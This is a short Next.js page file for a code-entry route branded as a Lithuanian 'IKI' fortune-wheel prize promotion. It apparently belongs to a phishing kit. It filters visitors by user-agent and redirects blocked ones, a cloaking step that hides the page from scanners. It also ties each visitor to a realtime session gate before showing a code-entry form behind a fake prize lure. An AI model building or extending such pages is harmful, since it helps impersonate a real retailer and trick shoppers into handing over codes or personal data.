import { headers } from "next/headers";
import { redirect } from "next/navigation";
import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { buildShareMetadata } from "@/lib/share-metadata";
import { getBlockedRedirectUrl } from "@/lib/geo-guard";
import { resumeOrRedirectHome } from "@/lib/session-resume";
import { CodeEntryClient } from "./code-client";

export const dynamic = "force-dynamic";

export async function generateMetadata() {
  return buildShareMetadata({
    title: "IKI — Laimės Ratas",
    description:
      "IKI specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
    canonical: "/code",
  });
}

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function CodeEntryPage({ searchParams }: Props) {
  const h = await headers();
  const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
  if (blockedUrl) redirect(blockedUrl);

  const params = await searchParams;
  await resumeOrRedirectHome(params);

  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: params,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <CodeEntryClient sessionId={sessionId} routeSessionId={routeSessionId} />
    </>
  );
}
